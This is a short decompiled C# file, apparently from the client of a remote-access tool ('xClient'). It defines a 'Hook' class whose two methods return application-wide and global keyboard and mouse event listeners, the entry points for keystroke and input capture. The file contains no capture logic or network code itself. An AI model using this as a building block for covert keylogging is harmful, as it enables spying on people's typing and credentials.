using System;
using xClient.Core.MouseKeyHook.Implementation;

namespace xClient.Core.MouseKeyHook
{
	// Token: 0x02000051 RID: 81
	public static class Hook
	{
		// Token: 0x06000211 RID: 529 RVA: 0x00002FA0 File Offset: 0x000011A0
		public static IKeyboardMouseEvents AppEvents()
		{
			return new AppEventFacade();
		}

		// Token: 0x06000212 RID: 530 RVA: 0x00002FA7 File Offset: 0x000011A7
		public static IKeyboardMouseEvents GlobalEvents()
		{
			return new GlobalEventFacade();
		}
	}
}
